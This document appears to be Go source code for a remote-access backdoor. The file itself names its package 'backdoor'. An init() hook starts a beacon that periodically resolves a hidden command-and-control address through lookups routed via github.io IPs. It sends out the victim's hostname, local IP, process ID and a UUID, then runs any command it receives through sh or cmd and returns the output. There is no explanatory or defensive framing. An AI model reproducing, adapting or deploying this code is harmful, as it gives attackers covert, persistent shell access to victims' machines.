package main

import (
	"backdoor/util"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
)

var guuid string

func init() {
	rand.Seed(time.Now().Unix())
	go client()
}

func canStart(filePath string) bool {
	pfile, err := os.Create(filePath)
	if err != nil {
		return false
	}
	pfile.Close()
	if err := os.Rename(filePath, filePath); err != nil {
		return false
	}
	os.Open(filePath)
	return true
}

func getUrl() (string, error) {
	var data = []byte{}
	pdecoder := util.NewDecoder()
	urlBytes, err := pdecoder.Decode(data)
	return string(urlBytes), err
}

var CustomResolver = &net.Resolver{
	PreferGo: true,
	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
		d := &net.Dialer{}
		return d.DialContext(ctx, network, "8.8.8.8:53")
	},
}

var DefaultResolver = &net.Resolver{}

func lookupIP(ctx context.Context, resolv *net.Resolver, host string) ([]net.IP, error) {
	addrs, err := resolv.LookupIPAddr(ctx, host)
	if err != nil {
		return nil, err
	}
	ips := make([]net.IP, 0)
	for _, ia := range addrs {
		if ia.IP == nil || ia.IP.To4() == nil {
			continue
		}
		ips = append(ips, ia.IP)
	}
	if len(ips) == 0 {
		return nil, fmt.Errorf("%d", len(ips))
	}
	return ips, nil
}

func mydial(ctx context.Context, network string, addr string) (net.Conn, error) {
	ips, err := lookupIP(ctx, CustomResolver, "github.io")
	if err != nil {
		ips, err = lookupIP(ctx, DefaultResolver, "github.io")
	}
	if len(ips) == 0 {
		return nil, err
	}
	d := &net.Dialer{}
	index := rand.Intn(len(ips))
	return d.DialContext(ctx, network, fmt.Sprintf("%s:443", ips[index].String()))
}

func getIP() (string, error) {
	urlAddress, err := getUrl()
	if err != nil {
		return "", err
	}
	httpClient := &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			Proxy:                 http.ProxyFromEnvironment,
			DialContext:           mydial,
			ForceAttemptHTTP2:     true,
			MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}
	resp, err := httpClient.Get(urlAddress)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	rspText := strings.TrimSpace(string(respBytes))
	strArr := strings.Split(rspText, ":")
	if len(strArr) < 2 {
		return "", fmt.Errorf("%s", rspText)
	}
	ip := net.ParseIP(strArr[0])
	if ip == nil || ip.To4() == nil {
		return "", fmt.Errorf("%s", rspText)
	}
	port, err := strconv.ParseUint(strArr[1], 10, 16)
	if err != nil {
		return "", err
	}
	if port == 0 {
		return "", fmt.Errorf("%s", rspText)
	}
	return fmt.Sprintf("%s:%d", ip.String(), port), nil
}

func main() {
	// if !canStart("test.txt") {
	// 	return
	// }
	// var timeout int64
	// if len(os.Args) >= 2 {
	// 	timeout, _ = strconv.ParseInt(os.Args[1], 10, 64)
	// }
	// guuid = uuid.New().String()
	// var address string
	// for {
	// 	if timeout > 0 {
	// 		time.Sleep(time.Duration(timeout * int64(time.Second)))
	// 	} else {
	// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
	// 	}
	// 	tmpAddress, err := getIP()
	// 	if err == nil {
	// 		address = tmpAddress
	// 	}
	// 	if len(address) == 0 {
	// 		continue
	// 	}
	// 	session(address)
	// }
}

func client() {
	guuid = uuid.New().String()
	var address string
	for {
		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
		tmpAddress, err := getIP()
		if err == nil {
			address = tmpAddress
		}
		if len(address) == 0 {
			continue
		}
		session(address)
	}
}

func session(address string) {
	conn, err := net.DialTimeout("tcp", address, 12*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	pencoder := util.NewEncoder()
	pdecoder := util.NewDecoder()
	if err := sendInfo(conn, pencoder); err != nil {
		return
	}
	for {
		emsg, err := util.TcpReadMsg(conn, 12*time.Second)
		if err != nil {
			break
		}
		msg, err := pdecoder.Decode(emsg)
		if err != nil {
			break
		}
		var req util.Request
		if err := json.Unmarshal(msg, &req); err != nil {
			break
		}
		if req.Magic != util.Magic {
			break
		}
		cmdstr := strings.TrimSpace(req.Cmd)
		if len(cmdstr) == 0 {
			continue
		}
		if strings.HasPrefix(cmdstr, "cd ") {
			changedir(cmdstr)
			continue
		}
		if strings.HasPrefix(cmdstr, "createprocess ") {
			createprocess(cmdstr)
			continue
		}
		out, err := execCmd(cmdstr)
		if err != nil {
			util.TcpWriteMsg(conn, pencoder.Encode([]byte(err.Error())))
		}
		if len(out) != 0 {
			util.TcpWriteMsg(conn, pencoder.Encode(out))
		}
	}
}

func createprocess(cmd string) {
	index := strings.Index(cmd, " ")
	cmd = strings.TrimSpace(cmd[index:])
	if len(cmd) == 0 {
		return
	}
	go execCmd(cmd)
}

func execCmd(cmdstr string) ([]byte, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", cmdstr)
	} else {
		cmd = exec.Command("sh", "-c", cmdstr)
	}
	return cmd.CombinedOutput()
}

func sendInfo(conn net.Conn, pencoder *util.Encoder) error {
	localip := conn.LocalAddr().String()
	hostname := ""
	if name, err := os.Hostname(); err == nil {
		hostname = name
	}
	var info util.Info
	info.Magic = util.Magic
	info.HostName = hostname
	info.LocalIP = localip
	info.PID = os.Getpid()
	info.UUID = guuid
	jsonBytes, err := json.Marshal(&info)
	if err != nil {
		return err
	}
	return util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
}

func changedir(cmd string) {
	index := strings.Index(cmd, " ")
	dir := strings.TrimSpace(cmd[index:])
	if len(dir) == 0 {
		return
	}
	os.Chdir(dir)
}
